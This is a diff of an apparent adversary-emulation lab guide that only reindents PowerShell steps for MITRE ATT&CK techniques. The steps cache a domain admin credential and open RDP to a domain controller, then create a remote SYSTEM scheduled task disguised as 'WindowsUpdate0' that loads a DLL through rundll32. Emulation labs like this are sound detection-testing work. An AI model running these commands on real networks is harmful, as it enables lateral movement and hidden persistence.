@@ -65,17 +65,17 @@ w> All labs require you to be running as an administrator.
 - MITRE ATT&CK Technique: [T1021.001 - Remote Services: Remote Desktop Protocol (RDP)](https://attack.mitre.org/techniques/T1021/001)
 - Copy and paste the following PowerShell commands into the terminal:
 
-   ```PowerShell
-   $cmd = @'
-   cmdkey /generic:TERMSRV/CORP-DC01 /user:corp.local\adminuser /pass:P@ssw0rd123
-   mstsc /v:CORP-DC01
-   echo "RDP connection initiating......"
-   '@
-   
-   $cmd += "`nStart-Sleep -Milliseconds $n"
-   powershell.exe -NoProfile $cmd
+```PowerShell
+$cmd = @'
+cmdkey /generic:TERMSRV/CORP-DC01 /user:corp.local\adminuser /pass:P@ssw0rd123
+mstsc /v:CORP-DC01
+echo "RDP connection initiating......"
+'@
 
-   ```
+$cmd += "`nStart-Sleep -Milliseconds $n"
+powershell.exe -NoProfile $cmd
+
+```
 
 ---
 
@@ -84,13 +84,13 @@ w> All labs require you to be running as an administrator.
 
 - MITRE ATT&CK Technique: [T1053.005 - Scheduled Task: Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/005)
 - Copy and paste the following PowerShell commands into the terminal:
-   ```PowerShell
-   Write-Host "Simulating Scheduled Task Creation on remote machine CORP-DC01..."
+```PowerShell
+Write-Host "Simulating Scheduled Task Creation on remote machine CORP-DC01..."
 
-   & Powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -command {
-       cmd.exe  /c SCHTASKS  /s CORP-DC01 /RU "SYSTEM" /create /tn "WindowsUpdate0" /tr "rundll32 C:\ProgramData\good.dll,good" /sc ONCE /sd 01/01/1910 /st 00:00
-   }
-   ```
+& Powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -command {
+cmd.exe  /c SCHTASKS  /s CORP-DC01 /RU "SYSTEM" /create /tn "WindowsUpdate0" /tr "rundll32 C:\ProgramData\good.dll,good" /sc ONCE /sd 01/01/1910 /st 00:00
+}
+```
 
 
 
